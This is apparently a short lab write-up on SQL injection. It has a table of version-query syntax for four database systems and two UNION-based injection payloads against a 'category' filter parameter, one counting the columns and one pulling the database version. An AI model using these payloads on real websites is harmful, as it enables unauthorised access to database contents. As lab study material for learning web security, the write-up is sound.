
| DB         | Description                                                          |
| ---------- | -------------------------------------------------------------------- |
| Oracle     | `SELECT banner FROM v$version`  <br>`SELECT version FROM v$instance` |
| Microsoft  | `SELECT @@version`                                                   |
| PostgreSQL | `SELECT version()`                                                   |
| MySQL      | `SELECT @@version`                                                   
- Verify the amount of columns:
```
GET /filter?category=' UNION SELECT null,null#
```
=> Get 2 columns, other situations return **Internal Server**.

- Query the version of database:
```
' UNION SELECT @@version,null#
```
